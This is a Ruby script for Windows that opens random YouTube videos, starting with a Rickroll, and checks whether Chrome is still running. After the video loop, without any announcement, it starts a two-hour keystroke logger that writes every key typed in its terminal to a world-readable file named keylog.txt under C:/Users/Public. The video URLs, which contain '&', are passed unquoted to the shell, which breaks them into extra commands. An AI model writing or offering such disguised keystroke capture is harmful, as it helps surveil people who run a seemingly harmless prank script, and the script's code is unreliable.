require 'open3'
require 'io/console'

# Define the list of videos
videos = [
  { title: 'Video 1', url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ&list=RDMMdQw4w9WgXcQ&start_radio=1' },
  { title: 'Video 2', url: 'https://www.youtube.com/watch?v=bia2_kCvawU&list=RDMMdQw4w9WgXcQ&index=2' },
  { title: 'Video 3', url: 'https://www.youtube.com/watch?v=aAkMkVFwAoo' },
  { title: 'Video 4', url: 'https://www.youtube.com/watch?v=QA-OYCfgEaA&list=RDMMdQw4w9WgXcQ&index=4' },
  { title: 'Video 5', url: 'https://www.youtube.com/watch?v=eLvD7-HjJhQ&list=RDMMdQw4w9WgXcQ&index=5' },
  { title: 'Video 6', url: 'https://www.youtube.com/watch?v=PGpIFET0kc4&list=RDMMdQw4w9WgXcQ&index=6' },
  { title: 'Video 7', url: 'https://www.youtube.com/watch?v=_1b4Xr236rc' },
  { title: 'Video 8', url: 'https://www.youtube.com/watch?v=js3Mx1M4lcE&list=RDMMdQw4w9WgXcQ&index=7' },
  { title: 'Video 9', url: 'https://www.youtube.com/watch?v=WMAUZ9XWb80&list=RDMMdQw4w9WgXcQ&index=14' },
  { title: 'Video 10', url: 'https://www.youtube.com/watch?v=5YsbA-A0w2I&list=RDMMdQw4w9WgXcQ&index=19' },
  { title: 'Video 11', url: 'https://www.youtube.com/watch?v=wu9IUDbWmRU&list=RDMMdQw4w9WgXcQ&index=22' },
  { title: 'Video 12', url: 'https://www.youtube.com/watch?v=asY3aLvgbcA&list=RDMMdQw4w9WgXcQ&index=25' },
  { title: 'Video 13', url: 'https://www.youtube.com/watch?v=EoVvI058KrI&list=RDMMdQw4w9WgXcQ&index=27' },
  { title: 'Video 14', url: 'https://www.youtube.com/watch?v=77vseB8e004&list=RDMMdQw4w9WgXcQ&index=28' },
  { title: 'Video 15', url: 'https://www.youtube.com/watch?v=MvK-hmjAm_E&list=RDMMdQw4w9WgXcQ&index=34' },
  { title: 'Video 16', url: 'https://www.youtube.com/watch?v=nwN2BudrUpM&list=RDMMdQw4w9WgXcQ&index=35' },
  { title: 'Video 17', url: 'https://www.youtube.com/watch?v=5RhFASrawv4&list=RDMMdQw4w9WgXcQ&index=37' },
  { title: 'Video 18', url: 'https://www.youtube.com/watch?v=E_SqOV65VDY' },
  { title: 'Video 19', url: 'https://www.youtube.com/watch?v=XqZsoesa55w' },
  { title: 'Video 20', url: 'https://www.youtube.com/watch?v=r7kA8hhskkQ' },
]

counter = 0
loop do
  # Launch the first YouTube video in your default web browser
  # Select a random video from the list
  video = videos.sample
  
  # Extract the video's URL and title
  video_url = video[:url]
  video_title = video[:title]
  
  # Use the `system` command to open the video in the default web browser
  system "start #{video_url}"
  
  puts "Now playing: #{video_title}"

  # Wait for 5 seconds before checking if the browser tab is still open
  
  sleep 5
  # Check if the browser tab is still open
  if system "tasklist /FI \"IMAGENAME eq chrome.exe\" | find /I \"chrome.exe\""
    puts "Browser tab is still open"
    sleep 5
    
  else
    puts "Browser tab is closed"
    # Launch the second and third YouTube videos in your default web browser
    system "start https://www.youtube.com/watch?v=g5tYiwur6Bo&list=RDGMEMQ1dJ7wXfLlqCjwV0xfSNbA&index=27"
    system "start https://www.youtube.com/watch?v=c98ArBOq6uE&list=RDGMEMQ1dJ7wXfLlqCjwV0xfSNbA&index=27"
    puts counter
  end
  counter += 1
  break if counter == 5
end

# Set the maximum logging time in seconds
MAX_LOG_TIME = 7200 # 2 hours

# Set the file path for the log file
LOG_FILE_PATH = "C:/Users/Public/keylog.txt"

# Initialize the log file
File.open(LOG_FILE_PATH, "w") do |file|
  file.truncate(0)
end

# Set the start time
start_time = Time.now

# Loop until the maximum logging time is reached or the terminal is closed
while (Time.now - start_time) < MAX_LOG_TIME
  # Read a single keystroke
  keystroke = STDIN.getch

  # Append the keystroke to the log file
  File.open(LOG_FILE_PATH, "a") do |file|
    file.puts(keystroke)
  end
end